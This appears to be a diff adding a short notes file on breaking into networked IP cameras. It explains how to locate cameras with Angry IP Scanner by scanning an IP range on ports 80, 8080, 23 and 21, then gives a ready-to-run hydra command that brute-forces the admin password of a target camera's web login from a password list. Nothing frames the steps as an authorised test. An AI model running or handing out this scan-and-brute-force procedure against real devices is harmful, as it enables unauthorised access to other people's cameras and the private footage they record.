@@ -1,0 +1,17 @@
+to get the Ip of cameras we have to use Angry IP scanner
+
+
+settings:
+
+put the range of IP 
+tools->pref->ports
+
+enter the port like 
+80,8080,23,21
+
+Also Enable WebDetect to confirm  that  the particular IP is  of camera
+
+
+to hack default password :
+
+hydra -s 80 -l admin -P /root/Desktop/CameraHackIP/passWord.txt -e ns -t 16 targetIP http
